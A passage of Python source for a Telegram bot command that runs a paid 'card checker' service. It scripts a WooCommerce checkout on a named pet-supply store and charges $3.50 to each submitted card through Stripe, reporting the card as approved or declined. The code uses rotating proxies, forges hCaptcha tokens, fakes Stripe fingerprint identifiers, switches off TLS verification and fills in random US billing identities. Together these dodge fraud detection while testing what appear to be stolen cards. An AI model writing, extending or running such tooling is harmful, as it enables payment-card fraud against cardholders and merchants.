                "Referer": f"{self.base_url}/checkout/",
            }

            logger.network(f"Sending update_order_review with security nonce: {self.update_order_review_nonce}")

            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=update_order_review", headers=update_headers, data=post_data)

            if response.status_code == 200:
                logger.success("Order review updated successfully")
                return True, None
            elif response.status_code == 403:
                logger.error("403 Forbidden - Possible security block")
                return False, "403 Forbidden - Site may be blocking automated requests"
            else:
                return False, f"Update order review failed: {response.status_code}"

        except Exception as e:
            logger.error(f"Update order review error: {str(e)}")
            return False, f"Update order review error: {str(e)}"

    async def create_stripe_payment_method(self, card_details, user_info):
        """Create Stripe payment method"""
        try:
            cc, mes, ano, cvv = card_details

            logger.step(6, 7, "Creating payment method...")

            # Generate GUIDs (from network data format)
            guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            
            # Get stripe mid/sid from cookies or generate
            muid = self.cookies.get('__stripe_mid', f"{random.randint(10000000, 99999999)}-7278-41eb-b2bc-{random.randint(100000000000, 999999999999)}")
            sid = self.cookies.get('__stripe_sid', f"{random.randint(10000000, 99999999)}-eedd-4efc-8379-{random.randint(100000000000, 999999999999)}")

            payment_data = {
                'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                'billing_details[phone]': user_info['phone'],
                'billing_details[email]': user_info['email'],
                'billing_details[address][city]': user_info['city'],
                'billing_details[address][country]': 'US',
                'billing_details[address][line1]': user_info['address'],
                'billing_details[address][postal_code]': user_info['postcode'],
                'billing_details[address][state]': user_info['state'],
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': ano[-2:] if len(ano) == 4 else ano,
                'card[exp_month]': mes.zfill(2),
                'allow_redisplay': 'unspecified',
                'pasted_fields': 'number',
                'payment_user_agent': 'stripe.js/e4b3a3b372; stripe-js-v3/e4b3a3b372; payment-element; deferred-intent',
                'referrer': self.base_url,
                'time_on_page': str(random.randint(200000, 250000)),
                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': self.stripe_key,
                '_stripe_account': self.stripe_account,
                '_stripe_version': '2022-08-01',
            }

            # Add hCaptcha token if available
            hcaptcha_token = 'P1_' + ''.join(random.choices(string.ascii_letters + string.digits, k=200))
            payment_data['radar_options[hcaptcha_token]'] = hcaptcha_token

            stripe_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            # Use separate client for Stripe API
            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                response = await stripe_client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=payment_data,
                    headers=stripe_headers,
                    timeout=30.0
                )

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id, 'full_response': result}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
                    return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def process_checkout(self, user_info, payment_method_id):
        """Process checkout with terms acceptance"""
        try:
            logger.step(7, 7, "Processing checkout with terms accepted...")

            # Build checkout data (from network data format)
            checkout_data = {
                'wc-ajax': 'checkout',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://finaticspetcenter.com/my-account/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '11',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'billing_first_name': user_info['first_name'],
                'billing_last_name': user_info['last_name'],
                'billing_company': '',
                'billing_country': 'US',
                'billing_address_1': user_info['address'],
                'billing_address_2': '',
                'billing_city': user_info['city'],
                'billing_state': user_info['state'],
                'billing_postcode': user_info['postcode'],
                'billing_phone': user_info['phone'],
                'billing_email': user_info['email'],
                'order_comments': '',
                'coupon_code': '',
                'payment_method': 'stripe_cc',
                'stripe_cc_token_key': payment_method_id,
                'stripe_cc_payment_intent_key': '',
                'terms': 'on',  # Accept terms and conditions
                'terms-field': '1',
                'woocommerce-process-checkout-nonce': self.checkout_nonce or '',
                '_wp_http_referer': f'{self.base_url}/checkout/?elementorPageId=13944&elementorWidgetId=40b2faa5'
            }

            checkout_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout/",
            }

            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)

            response_text = response.text

            if response.status_code != 200:
                logger.error(f"Checkout failed with status: {response.status_code}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            # Try to parse JSON response
            try:
                result = response.json()

                if isinstance(result, dict):
                    # Check if this is a 3D Secure response
                    if self.is_secure_required_response(result):
                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                        return {
                            'success': True,
                            'status': 'DECLINED',
                            'message': '3D SECURE❎'
                        }

                    if result.get('result') == 'success' and result.get('redirect'):
                        redirect_url = result.get('redirect', '').lower()

                        # If redirect contains confirmation patterns, it's likely 3D Secure
                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.success("Checkout successful - Payment APPROVED")
                        return {
                            'success': True,
                            'status': 'APPROVED',
                            'message': 'Successfully Charged $3.50'
                        }

                    if result.get('result') == 'failure':
                        logger.warning(f"Checkout failed with result: failure")
                        
                        error_msg = ""
                        if 'messages' in result and result['messages']:
                            error_msg = result['messages']
                            logger.warning(f"Raw error messages: {error_msg}")
                        
                        clean_error = self.extract_error_from_html(error_msg)
                        logger.warning(f"Extracted error: {clean_error}")

                        # Check for 3D Secure in error message
                        if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                            logger.warning("🔐 3D Secure authentication required")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.warning(f"❌ Checkout error: {clean_error}")
                        return {
                            'success': False,
                            'status': 'DECLINED',
                            'message': clean_error
                        }

                logger.warning(f"Unexpected JSON response format: {result}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': 'Unexpected response format'
                }

            except json.JSONDecodeError as json_error:
                logger.error(f"JSON parse error: {json_error}")

                decline_message = self.extract_error_from_html(response_text)
                if decline_message and decline_message != "Payment declined":
                    logger.warning(f"Extracted error from HTML: {decline_message}")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': decline_message
                    }
                else:
                    logger.warning("Could not extract error message from response")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Payment declined'
                    }

        except Exception as e:
            logger.error(f"Checkout processing error: {str(e)}")
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)[:100]}"
            }

    async def confirm_payment_intent(self, payment_method_id, client_secret):
        """Confirm payment intent if needed"""
        try:
            logger.step(8, 8, "Confirming payment intent...")
            
            # Extract payment intent ID from client_secret
            pi_id_match = re.search(r'(pi_[a-zA-Z0-9]+)_secret_', client_secret)
            if not pi_id_match:
                return {'success': False, 'status': 'DECLINED', 'message': 'Invalid client secret'}
            
            pi_id = pi_id_match.group(1)
            
            # Generate hCaptcha token
            hcaptcha_token = 'P1_' + ''.join(random.choices(string.ascii_letters + string.digits, k=300))
            
            confirm_data = {
                'return_url': f"{self.base_url}/checkout/?key=wc_order_433yRFqCHMtt3&order_id=997213&_stripe_payment_method=stripe_cc",
                'payment_method': payment_method_id,
                'expected_payment_method_type': 'card',
                'radar_options[hcaptcha_token]': hcaptcha_token,
                'use_stripe_sdk': 'true',
                'key': self.stripe_key,
                '_stripe_account': self.stripe_account,
                '_stripe_version': '2022-08-01',
                'client_secret': client_secret
            }
            
            confirm_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }
            
            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                response = await stripe_client.post(
                    f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                    data=confirm_data,
                    headers=confirm_headers,
                    timeout=30.0
                )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'succeeded':
                    return {'success': True, 'status': 'APPROVED', 'message': 'Successfully Charged $3.50'}
                elif result.get('status') == 'requires_action':
                    return {'success': True, 'status': 'DECLINED', 'message': '3D SECURE❎'}
                else:
                    return {'success': False, 'status': 'DECLINED', 'message': 'Payment declined'}
            elif response.status_code == 402:
                error_data = response.json()
                error_msg = error_data.get('error', {}).get('message', 'Your card was declined')
                return {'success': False, 'status': 'DECLINED', 'message': error_msg}
            else:
                return {'success': False, 'status': 'DECLINED', 'message': f'Stripe error: {response.status_code}'}
                
        except Exception as e:
            logger.error(f"Payment confirmation error: {str(e)}")
            return {'success': False, 'status': 'DECLINED', 'message': f'Confirmation error: {str(e)[:80]}'}

    async def check_card(self, card_details, username, user_data):
        """Main card checking method with proxy integration"""
        start_time = time.time()
        cc = mes = ano = cvv = ""
        bin_info = None
        
        logger.info(f"🔍 Starting Stripe Charge $3.50 check")

        # Step 0: Get proxy for user
        logger.step(0, 8, "Getting proxy...")
        
        if not PROXY_SYSTEM_AVAILABLE:
            logger.error("Proxy system not available")
            return await self.format_response("", "", "", "", "ERROR", "Proxy system unavailable", username, time.time()-start_time, user_data)
        
        self.proxy_url = get_proxy_for_user(self.user_id, "random")
        if not self.proxy_url:
            logger.error("No working proxies available")
            self.proxy_status = "Dead 🚫"
            return await self.format_response("", "", "", "", "ERROR", "No proxy available", username, time.time()-start_time, user_data)
        
        # VPS FIX: Create SSL context that allows all ciphers and protocols
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
        
        # Initialize httpx client with HTTP/1.1 only
        try:
            self.client = httpx.AsyncClient(
                proxy=self.proxy_url,
                timeout=httpx.Timeout(30.0, connect=15.0),
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=1, max_connections=2),
                verify=ssl_context,
                http1=True,
                http2=False,
                trust_env=False
            )
        except Exception as e:
            logger.error(f"Failed to initialize HTTP client: {str(e)}")
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            return await self.format_response("", "", "", "", "ERROR", f"Client init failed: {str(e)}", username, time.time()-start_time, user_data)
        
        # Test the proxy
        start_test = time.time()
        proxy_working = False
        
        for test_attempt in range(2):
            try:
                test_resp = await self.client.get("https://ipinfo.io/json", timeout=10)
                self.proxy_response_time = time.time() - start_test
                
                if test_resp.status_code == 200:
                    self.proxy_status = "Live ⚡️"
                    self.proxy_used = True
                    # FIX: Convert float to string properly using f-string formatting
                    logger.proxy(f"Proxy working: {self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s")
                    mark_proxy_success(self.proxy_url, self.proxy_response_time)
                    proxy_working = True
                    break
                else:
                    logger.warning(f"Proxy test returned status {test_resp.status_code}")
                    if test_attempt == 0:
                        await asyncio.sleep(1)
                        continue
                    else:
                        raise Exception(f"Proxy test failed with status {test_resp.status_code}")
                        
            except Exception as e:
                # FIX: Properly format the error message with string conversion
                logger.warning(f"Proxy test attempt {test_attempt + 1} failed: {str(e)}")
                if test_attempt == 0:
                    await asyncio.sleep(1.5)
                    continue
                else:
                    self.proxy_status = "Dead 🚫"
                    mark_proxy_failed(self.proxy_url)
                    await self.client.aclose()
                    return await self.format_response("", "", "", "", "ERROR", f"Proxy test failed: {str(e)}", username, time.time()-start_time, user_data)
        
        if not proxy_working:
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            await self.client.aclose()
            return await self.format_response("", "", "", "", "ERROR", "Proxy connection failed", username, time.time()-start_time, user_data)

        try:
            # Use intelligent parser to extract card details
            parsed = parse_card_input(card_details)
            if not parsed:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc, mes, ano, cvv = parsed

            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)

            if len(ano) == 2:
                ano = '20' + ano

            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Get US address
            address_info = random.choice(self.us_addresses)
            
            # Generate random email if needed
            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            email = address_info.get('email', f"{random_string}@gmail.com")

            user_info = {
                'first_name': address_info['first_name'],
                'last_name': address_info['last_name'],
                'email': email,
                'address': address_info['address'],
                'city': address_info['city'],
                'postcode': address_info['postcode'],
                'phone': address_info['phone'],
                'state': address_info['state']
            }

            logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")

            # Step 1: Initialize session
            if not await self.initialize_session():
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)

            # Step 2: Get wishlist data
            await self.get_woosw_button()

            # Step 3: Select variation and add to cart
            add_success, error = await self.select_variation()
            if not add_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error or "Failed to add to cart", username, time.time()-start_time, user_data, bin_info)

            # Step 4: Load checkout page and extract nonces
            checkout_success, checkout_error = await self.get_checkout_page()
            if not checkout_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout page error: {checkout_error}", username, time.time()-start_time, user_data, bin_info)

            # Step 5: Update order review with US address
            update_success, update_error = await self.update_order_review(user_info)
            if not update_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", update_error or "Update order review failed", username, time.time()-start_time, user_data, bin_info)

            # Step 6: Create Stripe payment method
            payment_result = await self.create_stripe_payment_method((cc, mes, ano, cvv), user_info)
            if not payment_result['success']:
                error_msg = payment_result['error']
                logger.warning(f"Payment method creation failed: {error_msg}")
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)

            # Step 7: Process checkout with terms accepted
            result = await self.process_checkout(user_info, payment_result['payment_method_id'])

            # Step 8: If payment requires confirmation, handle it
            if result.get('requires_confirmation') and result.get('client_secret'):
                confirm_result = await self.confirm_payment_intent(payment_result['payment_method_id'], result['client_secret'])
                result = confirm_result

            elapsed_time = time.time() - start_time
            logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")

            return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except httpx.ConnectError as e:
            logger.error(f"Connection error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
        finally:
            # Ensure client is closed
            if self.client:
                try:
                    await self.client.aclose()
                except:
                    pass

# Command handler
@Client.on_message(filters.command(["xs", ".xs", "$xs"]))
@auth_and_free_restricted
async def handle_stripe_charge_3(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # Check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown
        can_use, wait_time = check_cooldown(user_id, "xs")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "xs", 
                    "Stripe Charge $3.50",
                    "4111111111111111|12|2030|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE $3.50]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xs</code>
⟐ <b>Usage</b>: <code>/xs cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xs 4111111111111111|12|2030|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Stripe Charge 3.50$</code>""")
            return

        # Get the full message text after the command
        full_text = message.text
        # Remove the command part
        command_parts = full_text.split(maxsplit=1)
        if len(command_parts) < 2:
            await message.reply("Please provide card details")
            return
        
        card_input = command_parts[1].strip()

        # Parse using the intelligent parser
        parsed = parse_card_input(card_input)
        if not parsed:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Could not extract card details.
⟐ <b>Format 1</b>: <code>cc|mm|yy|cvv</code>
━━━━━━━━━━━━━""")
            return

        cc, mes, ano, cvv = parsed

        # Check if proxy system is available
        if not PROXY_SYSTEM_AVAILABLE:
            await message.reply("""<pre>❌ Proxy System Unavailable</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Proxy system is not available.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Show processing message
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Stripe Charge $3.50", "xs"
            ) if charge_processor else f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.50
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = StripeCharge3Checker(user_id=user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,
                checker.check_card,
                card_input,  # Pass the full input, not just card_details
                username,
                user_data,
                credits_needed=2,
                command_name="xs",
                gateway_name="Stripe Charge $3.50"
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback
            result = await checker.check_card(card_input, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
